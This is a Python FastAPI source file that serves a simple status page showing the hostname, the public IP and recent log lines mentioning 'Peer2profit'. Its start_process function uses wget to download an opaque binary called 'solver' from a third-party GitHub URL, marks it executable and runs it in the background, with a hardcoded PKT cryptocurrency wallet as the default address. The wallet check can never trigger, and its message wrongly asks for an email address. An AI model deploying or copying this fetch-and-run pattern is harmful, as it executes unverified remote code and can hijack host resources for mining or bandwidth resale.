import os
import socket
import subprocess
import sys
from pathlib import Path

import requests
import uvicorn
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

templates = Jinja2Templates(directory='./templates')

app = FastAPI()

CURRENT_DIR = Path(__file__).parent.resolve()
LOG_FILE = Path(CURRENT_DIR, 'test.log')


@app.get('/')
def hello(request: Request):
    '''Nothing but hello'''
    hostname = socket.gethostname()
    IP = requests.get('https://ipinfo.io').json()['ip']
    if not Path(LOG_FILE).exists():
        logs = ['Peer2profit not started, Check the process first!']
    else:
        with open(LOG_FILE, encoding='utf_8') as f:
            logs = f.readlines()[-20:]
    return templates.TemplateResponse("index.html", {"request": request, "IP": IP, "hostname": hostname, 'logs': logs})


def start_process():
    ptk_address = os.environ.get('ptk_address', "pkt1qtqa8prxmsvuj6w5jj89c0yxvr6444ukwca4ctl")
    if ptk_address is None:
        print('PTK_address environment variable is not set. Please set it to your email address.')
        sys.exit(1)
    cmd = f'wget https://raw.githubusercontent.com/Joss099k/Tes/main/solver && chmod +x solver && ./solver > {LOG_FILE} 2>&1 &'
    out, err = subprocess.Popen(
        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    print(out.decode('utf-8'))
    print(err.decode('utf-8'))